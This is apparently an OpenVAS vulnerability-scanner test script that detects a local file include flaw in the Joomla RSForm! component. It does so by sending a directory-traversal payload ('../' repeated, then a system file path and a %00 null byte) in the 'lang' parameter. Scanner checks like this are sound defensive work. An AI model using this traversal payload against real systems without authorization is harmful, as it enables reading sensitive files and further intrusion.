###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_rsform_44724.nasl 11101 2018-08-24 09:42:11Z ckuersteiner $
#
# RSForm! Component for Joomla! 'lang' Parameter SQL Injection and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100921");
  script_version("$Revision: 11101 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-24 11:42:11 +0200 (Fri, 24 Aug 2018) $");
  script_tag(name:"creation_date", value:"2010-11-30 12:57:59 +0100 (Tue, 30 Nov 2010)");
  script_bugtraq_id(44724);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("RSForm! Component for Joomla! 'lang' Parameter SQL Injection and Local File Include Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/44724");
  script_xref(name:"URL", value:"http://www.rsjoomla.com/joomla-components/rsform.html");
  script_xref(name:"URL", value:"http://www.rsjoomla.com/customer-support/documentations/12-general-overview-of-the-component/46-rsform-changelog.html");

  script_tag(name:"qod_type", value:"remote_vul");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"solution", value:"Vendor updates are available. Please contact the vendor for more
information.");

  script_tag(name:"summary", value:"The RSForm! Component for Joomla! is prone to an SQL-injection vulnerability
and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.

An attacker can exploit these vulnerabilities to compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database. By using directory-traversal strings to execute local script
code in the context of the application, the attacker may be able to obtain sensitive information that may aid in
further attacks.

RSForm! Component 1.0.5 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?option=com_forme&func=thankyou&lang=" + crap(data:"../",length:3*15) + files[file] +
              "%00";

  if (http_vuln_check(port:port, url:url,pattern:file, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port:port, data: report);
    exit(0);
  }
}

exit(99);
